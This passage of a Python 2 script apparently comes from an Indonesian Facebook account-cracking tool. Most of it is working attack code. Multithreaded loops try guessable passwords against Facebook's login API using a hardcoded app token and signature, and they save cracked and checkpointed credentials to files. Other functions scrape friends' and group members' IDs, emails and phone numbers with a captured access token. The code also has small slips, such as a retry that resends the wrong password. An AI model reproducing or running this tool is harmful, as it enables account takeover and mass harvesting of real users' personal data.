                                                                                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                                   q = json.load(data)
                                                                                                                                                   if 'access_token' in q:
                                                                                                                                                       print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;97m] ' + user +' | ' + pass20 +'==>' + b['name']                                               
                                                                                                                                                       print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                                   else:
                                                                                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                                                                                            print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass20 +'==>' + b['name'] 
                                                                                                                                                            print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                                        else:
                                                                                                                                                           pass21 = b['first_name'] + b['last_name'] + '1234'
                                                                                                                                                           data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                                           q = json.load(data)
                                                                                                                                                           if 'access_token' in q:
                                                                                                                                                               print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;97m] ' + user +' | ' + pass21 +'==>' + b['name']                                               
                                                                                                                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                                           else:
                                                                                                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                                                                                                     print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass21 +'==>' + b['name'] 
                                                                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
        except:
            passl

    p = ThreadPool(29)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    autocrack()

def manualcrack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;93m*SILAHKAN AMBIL KUMPULAN ID FACEBOOK TERLEBIH DAHULU*'
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword Crack Contoh(sayang) \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Connection busy'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] No connection'


def hasil():
    print
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def group():
       os.system('clear')
       try:
        toket = open('login.txt', 'r').read()
       except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
       else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
            gud = json.loads(uh.text)
            for p in gud['data']:
                nama = p['name']
                id = p['id']
                f = open('grupid.txt', 'w')
                listgrup.append(id)
                f.write(id + '\n')
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + str(nama)
                print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + str(id)
                print 40 * '\x1b[1;97m='

            print '\n\r\x1b[1;91m[+] \x1b[1;97mJumlah Grup \x1b[1;96m%s' % len(listgrup)
            print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m: \x1b[1;97mgrupid.txt'
            f.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Terhenti'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except KeyError:
            os.remove('grupid.txt')
            print '\x1b[1;91m[!] Grup tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] Tidak ada koneksi'
            keluar()
        except IOError:
            print '\x1b[1;91m[!] Kesalahan saat membuat file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu()


def grab():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║-> \x1b[1;37;40m1. Ambil ID Dari Teman'
    print '║-> \x1b[1;37;40m2. Ambil ID Teman Dari Teman'
    print '║-> \x1b[1;37;40m3. Ambil ID Dari Grup'
    print '║-> \x1b[1;37;40m4. Ambil Email Dari Teman'
    print '║-> \x1b[1;37;40m5. Ambil Email Teman Dari Teman'
    print '║-> \x1b[1;37;40m6. Ambil No Hp Dari Teman'
    print '║-> \x1b[1;37;40m7. Get Friend\'s Phone From Friends'
    print '║-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m║'
    grab_pilih()


def grab_pilih():
    cuih = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if cuih == '':
        print '\x1b[1;91m[!] Can\'t empty'
        grab_pilih()
    else:
        if cuih == '1':
            id_friends()
        else:
            if cuih == '2':
                idfrom_friends()
            else:
                if cuih == '3':
                    id_member_grup()
                else:
                    if cuih == '4':
                        email()
                    else:
                        if cuih == '5':
                            emailfrom_friends()
                        else:
                            if cuih == '6':
                                nomor_hp()
                            else:
                                if cuih == '7':
                                    hpfrom_friends()
                                else:
                                    if cuih == '0':
                                        menu()
                                    else:
                                        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + cuih + ' \x1b[1;91mnot found'
                                        grab_pilih()


def id_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_id, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['data']:
                idfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + save_id
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(save_id)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                grab()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


if __name__ == '__main__':
    login()

   
